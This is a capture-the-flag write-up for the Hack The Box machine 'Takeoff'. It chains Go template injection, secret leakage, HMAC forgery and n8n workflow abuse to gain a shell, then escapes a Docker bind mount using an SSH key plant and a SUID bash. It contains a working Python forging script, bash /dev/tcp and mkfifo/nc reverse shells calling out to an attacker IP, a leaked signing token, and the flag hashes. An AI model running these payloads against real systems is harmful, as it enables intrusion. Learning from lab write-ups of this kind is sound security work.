# HTB — Takeoff Writeup

**Difficulty:** Hard  
**OS:** Linux  
**Techniques:** SSTI (Go text/template), Arbitrary File Read, HMAC Forgery, n8n API RCE, Docker Bind-Mount Escape, SUID Privesc

---

## Index

1. [Reconnaissance](#reconnaissance)
2. [SSTI — Arbitrary File Read](#ssti--arbitrary-file-read)
3. [Secret Leak](#secret-leak)
4. [HMAC Forgery — RCE as www-data](#hmac-forgery--rce-as-www-data)
5. [n8n API — Shell as root in container](#n8n-api--shell-as-root-in-container)
6. [Container Escape — Host Root](#container-escape--host-root)
7. [Flags](#flags)

---

## Reconnaissance

Nmap reveals only two open ports:

```
22/tcp open  ssh
80/tcp open  http
```

Port 80 serves an airline booking web application ("HTB Airways") built in **Go with the Echo framework**, behind nginx. Internally, **MySQL** (3306) and **n8n** (5678) are running, both bound to loopback only.

---

## SSTI — Arbitrary File Read

The application flow allows registering an account, making a booking, and setting **ticket notes**. Those notes are rendered directly using Go's `text/template` engine without any sanitization.

Confirmation with the initial payload in the Notes field:

```
{{.}}
```

Response (visible inside the downloaded PDF):
```
&{0xc0000f4dc0 0xc000178800}
```

This reveals the root context is a struct with two pointer fields. Using `{{printf "%+v" .}}` confirms them as `Request` and `User`. The app has an **exported method** called `File` on the root struct:

```
{{.File "/etc/passwd"}}
```

The `.File` method is essentially a wrapper around `os.ReadFile()` with no path validation, giving us **arbitrary file read** as `www-data`.

> **Technical note:** In Go `text/template`, `{{.File "arg"}}` calls the method `File(string) string` on the root context struct, passing the argument directly. This is not a built-in engine function but a custom method registered on the struct — likely intended for legitimate use (e.g. embedding assets in PDFs), left dangerously unrestricted.

---

## Secret Leak

Reading the process environment:

```
{{.File "/proc/self/environ"}}
```

Two critical secrets are leaked:

```
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The process runs as `www-data` with working directory `/opt/htb-airways/booking/`.

---

## HMAC Forgery — RCE as www-data

### Check-in endpoint analysis

The `POST /api/check-in` endpoint receives a `qr_data` parameter which is a **base64-encoded blob** with the following internal structure:

```
[gob type-definition header (78 bytes)] + [gob value: {Data: <JSON bytes>}] + [0x00] + [HMAC-SHA256 (32 bytes)]
```

The JSON payload contains:

```json
{
  "PNR": "7SZWF2",
  "Token": "e06aa00535060fc90b37ba6712470e45",
  "Seat": "2D",
  "Passenger": "TEST",
  "NotifyCmd": "check-in-notify --pnr 7SZWF2 --email test@test.com"
}
```

The server takes `NotifyCmd` and **executes it directly as a system command**, after verifying the HMAC-SHA256 signature computed over all gob bytes (everything before the trailing `0x00` + signature).

### Signature scheme verification

```python
import hmac, hashlib

KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"
# gob_bytes = full blob minus the last 32 signature bytes
computed_sig = hmac.new(KEY, gob_bytes, hashlib.sha256).digest()
# computed_sig == extracted_sig → True
```

### Forging the malicious payload

Replacing `NotifyCmd` with a reverse shell and recomputing the signature:

```python
import base64, hmac, hashlib, json, urllib.parse

HEADER = bytes.fromhex(
    "4e10001d2a676f622e5665726966795469636b657441757468656e746963697479"
    "7f030101185665726966795469636b657441757468656e74696369747901ff8000"
    "0101010444617461010a000000"
)
KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"

def encode_gob_uint(x):
    if x < 0x80:
        return bytes([x])
    b = x.to_bytes((x.bit_length() + 7) // 8, 'big')
    return bytes([256 - len(b)]) + b

def build_gob(json_bytes):
    field = bytes([0x01]) + encode_gob_uint(len(json_bytes)) + json_bytes + bytes([0x00])
    tid   = encode_gob_uint(128)
    value = tid + encode_gob_uint(len(field)) + field
    return HEADER + encode_gob_uint(len(value)) + value

payload = {
    "PNR": "7SZWF2",
    "Token": "e06aa00535060fc90b37ba6712470e45",
    "Seat": "2D",
    "Passenger": "TEST",
    "NotifyCmd": "bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"
}
json_bytes = json.dumps(payload, separators=(',', ':')).encode()
gob  = build_gob(json_bytes)
sig  = hmac.new(KEY, gob, hashlib.sha256).digest()
qr   = base64.b64encode(gob + sig).decode()
print(urllib.parse.quote(qr, safe=''))
```

With a listener running (`nc -lvnp 4444`), sending this `qr_data` to `POST /api/check-in` gives us a shell as **www-data**.

---

## n8n API — Shell as root in container

n8n is listening on `127.0.0.1:5678`, now reachable from our www-data shell.

### Confirming API access

```bash
curl -s -H "X-N8N-API-KEY: <TOKEN>" http://127.0.0.1:5678/api/v1/workflows
```

Returns existing workflows as JSON → **API key is valid with owner-level permissions**.

### Creating the malicious workflow

```bash
cat > /tmp/wf.json << 'EOF'
{
  "name": "pwn",
  "nodes": [
    {
      "parameters": {
        "httpMethod": "GET",
        "path": "pwn-trigger",
        "responseMode": "onReceived"
      },
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2,
      "position": [250, 300],
      "webhookId": "pwn-trigger"
    },
    {
      "parameters": {
        "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.87 4445 > /tmp/f"
      },
      "name": "Execute Command",
      "type": "n8n-nodes-base.executeCommand",
      "typeVersion": 1,
      "position": [470, 300]
    }
  ],
  "connections": {
    "Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]}
  },
  "settings": {}
}
EOF
```

> **Note:** The n8n container is Alpine-based and has no `bash`. Using `mkfifo` + `nc` + `/bin/sh` instead.
> The first attempt with `bash -c 'bash -i >& /dev/tcp/...'` fails with `/bin/sh: bash: not found`.

```bash
# Create workflow
curl -s -X POST -H "X-N8N-API-KEY: <TOKEN>" -H "Content-Type: application/json" \
  -d @/tmp/wf.json http://127.0.0.1:5678/api/v1/workflows
# → returns id: "Pdkm0dXF9BOc3ZdB"

# Activate workflow
curl -s -X POST -H "X-N8N-API-KEY: <TOKEN>" \
  http://127.0.0.1:5678/api/v1/workflows/Pdkm0dXF9BOc3ZdB/activate

# Trigger the webhook
curl -s http://127.0.0.1:5678/webhook/pwn-trigger
```

With `nc -lvnp 4445` listening, we receive a shell as **root inside the n8n Docker container**.

```
/home/node # whoami
root
~ # cat user.txt
5321e834df5c2cc8cadb4ef279047962
```

---

## Container Escape — Host Root

### Bind-mount analysis

From inside the container:

```bash
cat /proc/self/mountinfo | grep root
# 309 293 8:4 /home/kpark /root rw,relatime - ext4 /dev/sda4 rw
```

The container's `/root` directory **is literally** the host's `/home/kpark`, bind-mounted directly from `/dev/sda4`, read-write, with no `nosuid` flag and no `userns-remap`.

From the host side, `/home` is hidden under a **decoy tmpfs** with `noexec,nosuid,ro`:

```
tmpfs /home tmpfs ro,nosuid,nodev,noexec,relatime ...
```

This prevents executing binaries directly from `/home/kpark`, but does **not** prevent writing to the directory from the container, nor does it block SSH logins.

### Step 1 — Plant SSH key

From the container (root → `/root` = host's `/home/kpark`):

```bash
mkdir -p /root/.ssh
echo "<ED25519_PUBLIC_KEY>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chown -R 1001:1001 /root/.ssh
```

SSH connection from attacker machine:

```bash
ssh -i /tmp/kpark_key kpark@takeoff.htb
```

### Step 2 — Create a native host SUID binary

The SUID trick requires a binary **native to the host** (glibc/Debian), not from the container (musl/Alpine) — they have incompatible ABIs. Copying the container's `busybox` fails with `required file not found` because the host's dynamic linker cannot resolve Alpine's musl-linked binary.

As `kpark` on the host, copy bash:

```bash
cp /bin/bash ~/bash_host
```

From the container (root), set SUID with root ownership:

```bash
chown root:root /root/bash_host
chmod u+s /root/bash_host
ls -la /root/bash_host
# -rwsr-xr-x 1 root root ... bash_host
```

### Step 3 — Execute and escalate

As `kpark` on the host:

```bash
kpark@takeoff:~$ ~/bash_host -p
bash_host-5.2# whoami
root
bash_host-5.2# cat /root/root.txt
1163732632c61ab4c6ada381b2ebec52
```

> **Why it works:** The SUID bit was set by UID 0 of the container. Without `userns-remap`, that UID 0 is the **same real UID 0 on the host**. The file lives on the rw bind-mount without `nosuid`. When `kpark` executes it with `-p` (privileged mode, prevents effective UID drop), the kernel sees SUID + owner root → runs with `euid=0`.

---

## Flags

| Flag | Hash |
|------|------|
| user.txt | `5321e834df5c2cc8cadb4ef279047962` |
| root.txt | `1163732632c61ab4c6ada381b2ebec52` |

---

## Full Attack Chain

```
SSTI (Go text/template — .File method)
  └─→ LFI: /proc/self/environ
        └─→ TICKET_VALIDATION_TOKEN + N8N_API_KEY leaked
              └─→ HMAC Forgery → NotifyCmd RCE → www-data shell
                    └─→ n8n API (localhost:5678) → Execute Command workflow
                          └─→ root shell inside Docker container (user.txt)
                                └─→ Bind-mount /home/kpark (rw, no nosuid, no userns-remap)
                                      └─→ SSH key plant → kpark SSH login
                                            └─→ SUID native bash → host root (root.txt)
```

---

## Dead Ends (documented in official guide)

- **sudo CVE:** The installed version is back-patched, not exploitable.
- **Custom sysmon root service:** Not a valid escalation vector.
- **World-writable `/opt/n8n` directory:** Tempting but leads nowhere in the attack chain.
